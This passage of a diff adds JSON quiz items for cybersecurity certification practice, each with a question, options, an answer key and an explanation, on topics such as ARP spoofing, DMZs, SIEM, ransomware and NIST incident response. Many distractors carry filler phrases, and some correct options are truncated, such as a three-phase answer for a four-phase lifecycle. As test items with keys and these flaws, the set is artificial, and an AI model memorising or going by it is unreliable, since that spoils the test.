+        "explanation": "An X.509 certificate binds a public key to an identity, vouched for by a Certificate Authority, which is the basis of PKI trust.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Which TCP/IP protocol has no built-in authentication, making ARP spoofing possible on a LAN?",
+        "options": [
+          "ARP",
+          "HTTPS",
+          "SSH",
+          "IPsec"
+        ],
+        "correct": 0,
+        "explanation": "ARP has no authentication, so an attacker can send forged replies (ARP spoofing) to redirect LAN traffic; HTTPS, SSH and IPsec authenticate.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.1"
+      },
+      {
+        "question": "How does network segmentation improve security?",
+        "options": [
+          "It encrypts every packet automatically in typical enterprise networks",
+          "It limits how far an attacker can move between zones",
+          "It removes the need for passwords inside each zone",
+          "It guarantees 100% uptime for all servers"
+        ],
+        "correct": 1,
+        "explanation": "Segmentation (VLANs, subnets, firewalls between zones) contains breaches and limits lateral movement, but it does not encrypt traffic or remove authentication.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "What is the role of a DMZ in a network?",
+        "options": [
+          "A zone that hosts internet-facing services isolated from the internal LAN",
+          "An encrypted tunnel between two offices in most production environments",
+          "A backup power supply for network gear for day-to-day operations",
+          "A list of blocked IP addresses in typical enterprise networks in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "A DMZ is a segment that exposes public services (web, mail) while keeping them isolated from the trusted internal network.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "What is a honeypot used for?",
+        "options": [
+          "To speed up legitimate traffic in typical enterprise networks",
+          "To lure and observe attackers on a decoy system",
+          "To store encrypted backups off-site",
+          "To balance load across web servers"
+        ],
+        "correct": 1,
+        "explanation": "A honeypot is a decoy system designed to attract attackers so their behaviour can be detected and studied without risking production.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "Which setting best secures a small-office Wi-Fi network?",
+        "options": [
+          "Hiding the SSID only in most production environments",
+          "WPA3 (or WPA2) with a strong passphrase",
+          "Leaving the default admin password",
+          "MAC filtering as the only control"
+        ],
+        "correct": 1,
+        "explanation": "Strong WPA3/WPA2 encryption with a good passphrase is the primary control; hiding the SSID or MAC filtering alone are weak and easily bypassed.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.4"
+      },
+      {
+        "question": "A remote worker needs encrypted access to internal servers over the internet. Which technology fits?",
+        "options": [
+          "A VPN",
+          "A DHCP server",
+          "A NAT pool",
+          "An NTP server"
+        ],
+        "correct": 0,
+        "explanation": "A VPN creates an encrypted tunnel so a remote user can reach internal resources securely over the public internet.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
+      },
+      {
+        "question": "What does NAC (Network Access Control) mainly check before allowing a device on the network?",
+        "options": [
+          "The device's identity and security posture",
+          "The exact model of the user's monitor",
+          "The number of open browser tabs",
+          "The brightness of the screen during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "NAC verifies who/what is connecting and whether the device meets posture requirements (patches, AV) before granting access.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "firewall-vpn",
+        "domain": "2.5"
+      },
+      {
+        "question": "On Windows, what does a host-based firewall such as Windows Defender Firewall do?",
+        "options": [
+          "Controls network connections to and from that single computer",
+          "Encrypts the computer's hard drive in most production environments",
+          "Scans email attachments on the mail server",
+          "Manages Active Directory group policy"
+        ],
+        "correct": 0,
+        "explanation": "A host-based firewall filters inbound/outbound traffic for the individual machine it runs on, complementing network firewalls.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "What is privilege escalation on an endpoint?",
+        "options": [
+          "Giving every app the same low rights",
+          "Gaining higher rights than originally granted",
+          "Renaming the administrator account when no other controls exist",
+          "Logging off idle users automatically"
+        ],
+        "correct": 1,
+        "explanation": "Privilege escalation is when an attacker or process obtains higher permissions than it should, such as moving from a standard user to SYSTEM/admin.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "Which command-line tool shows active network connections and listening ports on a host?",
+        "options": [
+          "netstat",
+          "ipconfig",
+          "chmod",
+          "traceroute"
+        ],
+        "correct": 0,
+        "explanation": "netstat lists active connections and listening ports, useful to spot suspicious services; ipconfig shows IP settings and traceroute maps paths.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.2"
+      },
+      {
+        "question": "Which tool captures and inspects raw packets on an interface for analysis?",
+        "options": [
+          "tcpdump",
+          "nslookup",
+          "whoami",
+          "ping"
+        ],
+        "correct": 0,
+        "explanation": "tcpdump captures raw packets for analysis; nslookup queries DNS, whoami shows the current user and ping tests reachability.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.2"
+      },
+      {
+        "question": "Which compliance framework specifically governs the protection of payment card data?",
+        "options": [
+          "PCI DSS",
+          "HIPAA",
+          "GDPR without additional tooling",
+          "FERPA"
+        ],
+        "correct": 0,
+        "explanation": "PCI DSS covers cardholder data; HIPAA covers US health data, GDPR covers EU personal data and FERPA covers US education records.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
+      },
+      {
+        "question": "What is the main security concern with a BYOD (bring your own device) policy?",
+        "options": [
+          "Devices use too little electricity according to common practice",
+          "Personal devices may be unmanaged and mix corporate with personal data",
+          "Employees will never install any apps during routine maintenance windows",
+          "The office Wi-Fi becomes faster in typical enterprise networks"
+        ],
+        "correct": 1,
+        "explanation": "BYOD means personal, often unmanaged devices access corporate data, so controls like MDM, encryption and containerization are needed.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "3.3"
+      },
+      {
+        "question": "Why is timely patching important for security?",
+        "options": [
+          "It makes the screen brighter according to common practice",
+          "It closes known vulnerabilities before they are exploited",
+          "It increases the disk size without additional tooling",
+          "It disables all logging across mixed vendor fleets"
+        ],
+        "correct": 1,
+        "explanation": "Patching fixes known flaws; many breaches exploit vulnerabilities for which a patch already exists but was not applied.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.4"
+      },
+      {
+        "question": "On Windows, which tool do you open first to review system and security event logs?",
+        "options": [
+          "Event Viewer",
+          "Task Manager",
+          "Disk Cleanup",
+          "Notepad"
+        ],
+        "correct": 0,
+        "explanation": "Event Viewer shows Windows system, application and security logs, the starting point to spot anomalies on a host.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "On Linux, where are many authentication and system messages traditionally collected?",
+        "options": [
+          "In the syslog facility (e.g. /var/log)",
+          "In the BIOS firmware across mixed vendor fleets",
+          "In the swap partition",
+          "In the GPU memory in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Linux collects auth and system messages via syslog, typically under /var/log (auth.log, messages, journal), used for anomaly detection.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "What is the difference between active and passive reconnaissance?",
+        "options": [
+          "Active interacts with the target; passive only observes available data",
+          "Active is always legal; passive is always illegal during routine maintenance windows",
+          "Active uses IPv6; passive uses IPv4 for day-to-day operations",
+          "There is no difference between them for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "Active recon sends probes to the target (port scans), which is detectable; passive recon gathers public info without touching the target.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.1"
+      },
+      {
+        "question": "What does a CVE identifier represent?",
+        "options": [
+          "A unique reference for a publicly known vulnerability",
+          "A Cisco VPN encryption standard for day-to-day operations",
+          "A credential vault export format across mixed vendor fleets",
+          "A certificate validity extension"
+        ],
+        "correct": 0,
+        "explanation": "A CVE (Common Vulnerabilities and Exposures) ID uniquely references a publicly disclosed vulnerability so tools and advisories can agree on it.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.2"
+      },
+      {
+        "question": "How do vulnerability and risk differ?",
+        "options": [
+          "They are exactly the same thing",
+          "A vulnerability is a weakness",
+          "Risk only applies to hardware across mixed vendor fleets",
+          "A vulnerability always causes a breach"
+        ],
+        "correct": 1,
+        "explanation": "A vulnerability is a weakness; risk combines the likelihood that a threat exploits it with the resulting impact, so not every vulnerability is high risk.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.3"
+      },
+      {
+        "question": "In disaster recovery, what does RPO (Recovery Point Objective) define?",
+        "options": [
+          "How much data loss, measured in time, is acceptable",
+          "How fast the office lights turn on",
+          "How many users can log in at once",
+          "The maximum password length without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "RPO is the maximum acceptable amount of data loss expressed as a time window, which drives how often backups must run.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
+      },
+      {
+        "question": "A disaster recovery control that detects an incident in progress (e.g. an IDS alert) is classified as which type?",
+        "options": [
+          "Preventive",
+          "Detective",
+          "Corrective",
+          "Cosmetic"
+        ],
+        "correct": 1,
+        "explanation": "Controls are preventive (stop it), detective (notice it) or corrective (fix it); an IDS alert that notices an event is detective.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.4"
+      },
+      {
+        "question": "What does a SIEM mainly do in a security operations centre?",
+        "options": [
+          "Collects and correlates logs from many sources to raise alerts",
+          "Physically locks the server room door for day-to-day operations",
+          "Encrypts all user laptops in typical enterprise networks",
+          "Routes packets between VLANs when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "A SIEM aggregates and correlates logs/events from across the estate so analysts can detect and investigate incidents.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "How does SOAR add value on top of a SIEM?",
+        "options": [
+          "It automates and orchestrates response actions for alerts",
+          "It replaces the need to collect any logs",
+          "It is only a faster antivirus engine during routine maintenance windows",
+          "It encrypts the SIEM database at rest only"
+        ],
+        "correct": 0,
+        "explanation": "SOAR adds automated playbooks and orchestration so repetitive response steps run automatically, reducing analyst workload.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "What does the Cyber Kill Chain model describe?",
+        "options": [
+          "The ordered stages an attacker goes through",
+          "A list of approved encryption ciphers",
+          "The wiring order of an Ethernet cable",
+          "A backup rotation schedule for day-to-day operations"
+        ],
+        "correct": 0,
+        "explanation": "The Cyber Kill Chain breaks an intrusion into ordered phases (reconnaissance, weaponization, delivery, exploitation, installation, C2, actions), helping defenders interrupt it.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "What is the MITRE ATT&CK matrix primarily a catalogue of?",
+        "options": [
+          "Adversary tactics and techniques observed in the real world",
+          "Approved firewall vendors across mixed vendor fleets",
+          "IP address allocation ranges in most production environments",
+          "Cable colour standards without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "ATT&CK catalogues real-world adversary tactics (goals) and techniques (how), used to map detections and assess coverage.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "In incident handling, what is 'chain of custody'?",
+        "options": [
+          "The order switches forward frames",
+          "A documented record of who handled evidence and when",
+          "The sequence of firewall rules in typical enterprise networks",
+          "The list of users in a group for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "Chain of custody is the documented trail showing how evidence was collected, handled and stored, so it stays admissible and trustworthy.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Under GDPR, what is a key obligation after a qualifying personal-data breach?",
+        "options": [
+          "Notify the supervisory authority within the required timeframe",
+          "Delete all company backups immediately without additional tooling",
+          "Publicly post every affected password in most production environments",
+          "Shut down the entire network for a week"
+        ],
+        "correct": 0,
+        "explanation": "GDPR requires notifying the supervisory authority (generally within 72 hours) and, when high risk, informing affected individuals.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "5.3"
+      },
+      {
+        "question": "Which sequence matches the NIST SP 800-61 incident response lifecycle?",
+        "options": [
+          "Preparation; Detection & Analysis; Containment",
+          "Backup; Restore; Reboot; Report",
+          "Scan; Patch; Scan; Patch for day-to-day operations",
+          "Login; Logout; Audit; Delete"
+        ],
+        "correct": 0,
+        "explanation": "NIST SP 800-61 defines four phases: Preparation; Detection & Analysis; Containment, Eradication & Recovery; and Post-Incident Activity (lessons learned).",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.4"
+      },
+      {
+        "question": "What distinguishes ransomware from other malware?",
+        "options": [
+          "It silently speeds up the computer in most production environments",
+          "It encrypts or locks data and demands payment to restore access",
+          "It only displays harmless advertisements",
+          "It improves battery life on laptops for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "Ransomware encrypts or locks the victim's data and demands a ransom for the decryption key or restored access.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is an insider threat?",
+        "options": [
+          "A risk coming from someone with legitimate access, like an employee",
+          "An external scanner probing the firewall",
+          "A power failure in the data center during routine maintenance windows",
+          "A software bug in the router firmware without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "An insider threat arises from people with authorized access (employees, contractors) who misuse it, whether maliciously or by negligence.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is a man-in-the-middle (MitM) attack?",
+        "options": [
+          "An attacker secretly relays and may alter traffic between two parties",
+          "A scheduled backup that runs at midnight according to common practice",
+          "A firewall rule that drops all traffic across mixed vendor fleets",
+          "A type of RAID disk array when no other controls exist"
+        ],
+        "correct": 0,
+        "explanation": "In a MitM attack the adversary positions between two communicating parties to intercept and possibly modify their traffic.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Which is a common IoT device security weakness?",
+        "options": [
+          "Having too much RAM across mixed vendor fleets",
+          "Shipping with default or hardcoded credentials",
+          "Running too many security updates",
+          "Using encrypted firmware by default"
+        ],
+        "correct": 1,
+        "explanation": "Many IoT devices ship with default/hardcoded passwords and rarely get patched, making them easy targets and botnet recruits.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is an 'attack vector'?",
+        "options": [
+          "The path or method an attacker uses to reach and compromise a target",
+          "A graph of CPU temperature across mixed vendor fleets for day-to-day operations",
+          "The physical length of a network cable without additional tooling",
+          "A spreadsheet of user salaries in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "An attack vector is the route/technique (phishing email, exposed port, USB) through which an attacker gains access to a system.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "Why is MD5 considered unsuitable for security-sensitive hashing today?",
+        "options": [
+          "It is too slow for modern CPUs according to common practice",
+          "It is vulnerable to practical collision attacks",
+          "It produces variable-length output",
+          "It requires a shared secret key"
+        ],
+        "correct": 1,
+        "explanation": "MD5 has practical collision attacks, so two different inputs can share a hash; stronger algorithms such as SHA-256 are recommended.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "What is a denial-of-service (DoS) attack trying to do?",
+        "options": [
+          "Steal password hashes silently",
+          "Make a service unavailable to legitimate users",
+          "Encrypt files for ransom according to common practice",
+          "Escalate privileges to administrator"
+        ],
+        "correct": 1,
+        "explanation": "A DoS attack overwhelms or crashes a service so legitimate users cannot use it; DDoS does this from many sources at once.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is the purpose of a strong password policy?",
+        "options": [
+          "To force users to share passwords",
+          "To reduce the chance of guessable or reused credentials",
+          "To store passwords in plaintext during routine maintenance windows",
+          "To disable account lockouts when no other controls exist"
+        ],
+        "correct": 1,
+        "explanation": "A good password policy (length, complexity, no reuse, lockout) reduces the risk of weak or guessable credentials being cracked.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "How does NAT affect direct inbound connections from the internet to an internal host?",
+        "options": [
+          "It makes internal hosts directly reachable by public IP",
+          "It hides internal hosts behind a public address",
+          "It encrypts all internal traffic without additional tooling",
+          "It assigns IPv6 addresses to every host"
+        ],
+        "correct": 1,
+        "explanation": "NAT maps private addresses to a public one; unsolicited inbound connections have no mapping, so internal hosts are not directly reachable by default.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "What is the safe first step when a host shows signs of malware infection?",
+        "options": [
+          "Keep using it normally in most production environments",
+          "Isolate it from the network and run a trusted scan",
+          "Share its files to coworkers",
+          "Disable all its logging across mixed vendor fleets"
+        ],
+        "correct": 1,
+        "explanation": "Isolating the host stops spread and C2, then a trusted scan and investigation can proceed before cleanup or reimaging.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.6"
+      },
+      {
+        "question": "What does a port scan accomplish for an attacker or auditor?",
+        "options": [
+          "It patches vulnerable services in typical enterprise networks",
+          "It discovers which TCP/UDP ports and services are open on a host",
+          "It encrypts the target's disk in most production environments",
+          "It resets user passwords in typical enterprise networks across mixed vendor fleets"
+        ],
+        "correct": 1,
+        "explanation": "A port scan enumerates open ports and listening services, revealing the attack surface; it is reconnaissance, not a fix.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.1"
+      },
+      {
+        "question": "When monitoring security events, what should trigger escalation?",
+        "options": [
+          "Every successful normal login during routine maintenance windows",
+          "A credible sign of a security incident beyond routine noise",
+          "A scheduled nightly backup finishing without additional tooling",
+          "A user changing their desktop wallpaper"
+        ],
+        "correct": 1,
+        "explanation": "Analysts escalate when evidence suggests a real incident (e.g. confirmed malware, data exfiltration), not for routine, benign events.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.1"
+      },
+      {
+        "question": "Which best describes asymmetric encryption?",
+        "options": [
+          "One shared secret key encrypts and decrypts",
+          "A public key encrypts and a matching private key decrypts",
+          "It never uses keys at all for day-to-day operations",
+          "It only works on data at rest in most production environments"
+        ],
+        "correct": 1,
+        "explanation": "Asymmetric (public-key) crypto uses a key pair: the public key encrypts (or verifies) and the private key decrypts (or signs).",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "Why is DHCP a security concern on an untrusted LAN?",
+        "options": [
+          "It encrypts traffic too strongly when no other controls exist",
+          "A rogue DHCP server can hand out a malicious gateway or DNS",
+          "It uses TCP port 443 only in most production environments",
+          "It disables ARP entirely across mixed vendor fleets"
+        ],
+        "correct": 1,
+        "explanation": "A rogue DHCP server can assign a malicious default gateway/DNS to clients, enabling interception; DHCP snooping mitigates this.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.1"
+      },
+      {
+        "question": "Which example best fits 'something you are' as an authentication factor?",
+        "options": [
+          "A PIN code",
+          "A fingerprint",
+          "A hardware token",
+          "A security question"
+        ],
+        "correct": 1,
+        "explanation": "Authentication factors are something you know (PIN), have (token) or are (biometric); a fingerprint is 'something you are'.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.1"
+      },
+      {
+        "question": "In the Diamond Model of Intrusion Analysis, which four core features are linked?",
+        "options": [
+          "Adversary, Capability, Infrastructure, Victim",
+          "Router, Switch, Firewall, Server",
+          "Red, Blue, Purple, Green during routine maintenance windows",
+          "Preparation, Detection, Recovery, Review"
+        ],
+        "correct": 0,
+        "explanation": "The Diamond Model links adversary, capability, infrastructure and victim to reason about an intrusion event.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Risk levels are often ranked as low, medium, high and extremely high mainly to help organizations do what?",
+        "options": [
+          "Pick desk colors when no other controls exist",
+          "Prioritize which risks to treat first",
+          "Choose the office location",
+          "Set the Wi-Fi channel"
+        ],
+        "correct": 1,
+        "explanation": "Ranking risk severity lets organizations prioritize mitigation effort and budget on the most serious risks first.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.3"
+      },
+      {
+        "question": "What does asset management contribute to endpoint security?",
+        "options": [
+          "It makes screens larger without additional tooling",
+          "It keeps an inventory so unknown or unpatched devices can be found",
+          "It encrypts email automatically according to common practice",
+          "It speeds up the CPU according to common practice in most production environments"
+        ],
+        "correct": 1,
+        "explanation": "A hardware/software inventory lets security teams spot unmanaged, rogue or unpatched devices that would otherwise be blind spots.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.3"
+      },
+      {
+        "question": "Which statement about spear phishing is correct?",
+        "options": [
+          "It targets a specific person or organization with tailored content",
+          "It is always sent as a printed letter during routine maintenance windows",
+          "It never uses email without additional tooling",
+          "It only affects routers during routine maintenance windows"
+        ],
+        "correct": 0,
+        "explanation": "Spear phishing is targeted: the attacker tailors the lure to a specific victim using personal or organizational details.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Which protocol secures web traffic by encrypting HTTP?",
+        "options": [
+          "HTTPS (HTTP over TLS)",
+          "FTP across mixed vendor fleets",
+          "Telnet in most production environments",
+          "SNMPv1"
+        ],
+        "correct": 0,
+        "explanation": "HTTPS runs HTTP over TLS to encrypt web traffic; FTP, Telnet and SNMPv1 send data in cleartext by default.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "When reviewing logs, which pattern most suggests a brute-force login attempt?",
+        "options": [
+          "One successful login in the morning",
+          "Many failed logins for one account in a short time",
+          "A single DNS query according to common practice",
+          "A scheduled backup event when no other controls exist"
+        ],
+        "correct": 1,
+        "explanation": "A burst of failed authentications against an account (or many accounts) in a short window is a classic brute-force/spraying signature.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "3.5"
+      },
+      {
+        "question": "What is the main security role of a proxy server for outbound web access?",
+        "options": [
+          "It assigns IP addresses to clients",
+          "It mediates and can filter/log web requests from clients",
+          "It replaces the firewall entirely in typical enterprise networks",
+          "It encrypts the local disk for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "A forward proxy mediates clients' outbound web requests, allowing filtering, logging and malware inspection of that traffic.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "What does 'hardening' a system mean?",
+        "options": [
+          "Adding more RAM to it for day-to-day operations during routine maintenance windows",
+          "Reducing its attack surface by removing unneeded services and tightening config",
+          "Painting the server case according to common practice",
+          "Increasing the monitor resolution according to common practice"
+        ],
+        "correct": 1,
+        "explanation": "Hardening reduces attack surface: disable unused services/ports, remove default accounts, apply secure settings and patches.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "1.1"
+      },
+      {
+        "question": "What is the main benefit of accounting (the third A in AAA)?",
+        "options": [
+          "It blocks all network traffic for day-to-day operations",
+          "It records user actions for auditing and forensics",
+          "It encrypts the password database",
+          "It assigns VLANs automatically during routine maintenance windows"
+        ],
+        "correct": 1,
+        "explanation": "Accounting logs what authenticated users did (commands, sessions, data), supporting auditing, billing and incident investigation.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "identidade",
+        "domain": "1.3"
+      },
+      {
+        "question": "What does a rootkit primarily try to do?",
+        "options": [
+          "Improve system performance without additional tooling",
+          "Hide its presence and maintain privileged access on a system",
+          "Back up user files during routine maintenance windows",
+          "Update firmware safely when no other controls exist in typical enterprise networks"
+        ],
+        "correct": 1,
+        "explanation": "A rootkit hides malware and maintains stealthy privileged access, often by subverting the OS so standard tools cannot see it.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "Why are private IP ranges (like 10.0.0.0/8) not routable on the public internet?",
+        "options": [
+          "They are reserved for internal use and dropped by internet routers",
+          "They are faster than public IPs across mixed vendor fleets",
+          "They are only for IPv6 for day-to-day operations without additional tooling",
+          "They are encrypted by design without additional tooling"
+        ],
+        "correct": 0,
+        "explanation": "RFC 1918 private ranges are reserved for internal networks and are not routed on the public internet, which is why NAT is used.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.2"
+      },
+      {
+        "question": "What are TTPs in threat analysis?",
+        "options": [
+          "Tactics, Techniques and Procedures of an adversary",
+          "Transport Table Protocols",
+          "Trusted Terminal Ports during routine maintenance windows",
+          "Temporary Test Passwords according to common practice"
+        ],
+        "correct": 0,
+        "explanation": "TTPs describe how an adversary operates: their tactics (goals), techniques (methods) and procedures (specific implementations).",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "logs-ir",
+        "domain": "5.2"
+      },
+      {
+        "question": "Why should incident documentation be updated and securely shared during a response?",
+        "options": [
+          "To slow down the investigation without additional tooling",
+          "To keep responders coordinated and preserve an accurate record",
+          "To expose evidence publicly in typical enterprise networks",
+          "To delete all prior notes when no other controls exist according to common practice"
+        ],
+        "correct": 1,
+        "explanation": "Keeping documentation current and securely shared keeps the team coordinated and preserves an accurate, admissible record of the incident.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "risco",
+        "domain": "4.2"
+      },
+      {
+        "question": "What do file and directory permissions primarily enforce?",
+        "options": [
+          "Which users or processes may read",
+          "The screen refresh rate for day-to-day operations",
+          "The order of boot devices",
+          "The Wi-Fi channel width"
+        ],
+        "correct": 0,
+        "explanation": "Permissions enforce access control at the filesystem level, deciding which users/processes can read, write or execute each resource.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "endpoint",
+        "domain": "3.1"
+      },
+      {
+        "question": "What does virtualization add to security planning in a data center?",
+        "options": [
+          "It removes the need for any patching",
+          "Multiple isolated VMs share hardware",
+          "It makes all servers physical again",
+          "It disables logging by default without additional tooling"
+        ],
+        "correct": 1,
+        "explanation": "Virtualization consolidates many isolated VMs on shared hardware, so VM isolation, hypervisor hardening and snapshots become security concerns.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "rede-cloud",
+        "domain": "2.3"
+      },
+      {
+        "question": "What is the core trait that makes social engineering effective?",
+        "options": [
+          "It exploits human trust and behaviour rather than only technical flaws",
+          "It only works against old hardware according to common practice in typical enterprise networks",
+          "It requires physical access every time across mixed vendor fleets",
+          "It needs the victim's private key in most production environments"
+        ],
+        "correct": 0,
+        "explanation": "Social engineering manipulates people (trust, urgency, authority) to bypass technical controls, which is why awareness training matters.",
+        "difficulty": "Easy",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
+      },
+      {
+        "question": "What is the role of a Certificate Authority (CA) in PKI?",
+        "options": [
+          "It stores user passwords when no other controls exist",
+          "It issues and vouches for the authenticity of digital certificates",
+          "It encrypts the hard disk in typical enterprise networks",
+          "It assigns IP addresses across mixed vendor fleets for day-to-day operations"
+        ],
+        "correct": 1,
+        "explanation": "A CA is a trusted third party that issues and signs certificates, vouching that a public key belongs to the named identity.",
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "cripto",
+        "domain": "1.4"
+      },
+      {
+        "question": "How do threat, vulnerability and exploit relate?",
+        "options": [
+          "A threat is a weakness; an exploit is a natural disaster",
+          "A threat may use an exploit against a vulnerability to cause harm",
+          "They are three names for the same thing across mixed vendor fleets",
+          "An exploit always patches a vulnerability"
+        ],
+        "correct": 1,
+        "explanation": "A threat is a potential cause of harm; a vulnerability is a weakness; an exploit is the method that uses that weakness.",
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "risco",
+        "domain": "1.4"
+      },
+      {
+        "question": "In CVSS, what does the Attack Vector metric describe?",
+        "options": [
+          "How far away the attacker can be to exploit the vulnerability",
+          "The cost of the exploit kit in typical enterprise networks",
+          "The colour of the alert in most production environments",
+          "The age of the patch without additional tooling in most production environments"
+        ],
+        "correct": 0,
